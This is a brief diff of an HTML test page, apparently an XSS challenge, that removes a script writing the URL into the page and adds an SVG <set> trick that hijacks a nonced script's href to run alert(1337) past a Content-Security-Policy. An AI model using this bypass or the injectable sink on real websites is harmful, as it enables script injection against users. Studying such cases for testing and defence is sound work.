@@ -2,12 +2,10 @@
 <head>
 <meta http-equiv=content-security-policy content="object-src 'none';script-src 'nonce-random-secret'">
 <title> Fake XSS </title> </head>
-<body>
-
-<script nonce=random-secret>document.write(unescape(location.href))</script>
-
-
-<script id=script nonce=random-secret>foo.bar()</script>
+<body><!--xss xss xss-->
+  <svg><set href=#script attributeName=href to=data:,alert(1337) />
+    <!--/xss xss xss-->
+    <footer>blablabla</footer><script id=script nonce=random-secret>foo.bar()</script>
 </body>
 </html>
 
